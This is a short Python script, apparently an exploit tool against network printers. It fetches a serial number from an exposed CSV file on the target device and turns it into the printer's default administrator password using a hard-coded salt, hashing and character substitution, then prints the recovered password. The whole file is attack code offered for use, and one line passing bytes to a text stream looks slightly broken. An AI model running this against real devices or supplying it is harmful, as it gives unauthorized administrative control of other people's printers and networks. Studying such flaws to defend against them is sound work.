import base64
import csv
import hashlib
import io

import requests

SALT = b"7HOLDhk'"
SUBSTITUTION = {"l": "#", "I": "$", "z":"%", "Z":"&", "b": "*", "q":"-", "O":":", "o":"?", "v":"@", "y":">"}

CSV_PATH = "/etc/mnt_info.csv"


def create_default_password(serial_number):
    serial_number = serial_number[:16].encode()
    salt = bytearray([char-1 for char in reversed(SALT)])
    buffer = serial_number + salt
    buffer = hashlib.sha256(buffer).digest()
    buffer = base64.b64encode(buffer).decode()
    buffer = "".join([SUBSTITUTION.get(char, char) for char in buffer[:8]])
    return buffer

def get_serial(printer_url):
    url = printer_url + CSV_PATH
    csv_data = requests.get(url).content
    rows = [row for row in csv.DictReader(io.StringIO(csv_data), delimiter=",")]
    return rows[0].get("Serial No.")

def brudi(printer_url):
    serial = get_serial(printer_url)
    password = create_default_password(serial)
    print(printer_url, password)
